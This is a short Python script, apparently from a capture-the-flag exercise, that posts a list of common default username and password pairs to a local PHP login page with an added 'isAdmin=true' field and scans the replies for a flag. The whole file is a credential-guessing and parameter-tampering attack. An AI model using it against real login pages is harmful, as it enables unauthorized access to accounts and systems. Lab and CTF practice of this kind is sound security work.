import requests
import re

url = "http://127.0.0.1:32829/index.php"

# Prioritized credentials (most common first)
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("administrator", "admin"),
    ("bart", "bart"),
    ("homer", "homer"),
    ("user", "password"),
    ("guest", "guest"),
]

print(f"[*] Testing {len(credentials)} high-priority credential combinations with isAdmin=true\n")

for username, password in credentials:
    data = {
        "username": username,
        "password": password,
        "isAdmin": "true"
    }
    
    try:
        response = requests.post(url, data=data, allow_redirects=False, timeout=10)
        response_length = len(response.text)
        
        # Check for success indicators
        has_flag = "FLAG{" in response.text
        has_cookies = bool(response.cookies)
        
        # Always print result
        print(f"[{username}:{password}] Status: {response.status_code} | Length: {response_length}B | Cookies: {bool(response.cookies)}")
        
        if has_flag or has_cookies or response_length != 1164:
            print(f"  [+] ANOMALY DETECTED!")
            
            # Search for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"  [!!!] FLAG FOUND: {flag_match.group(0)}")
            
            # Print response
            print(f"  Response:\n{response.text}\n")
            
    except Exception as e:
        print(f"[!] Error with {username}:{password} - {e}")

print("\n[*] Testing complete")

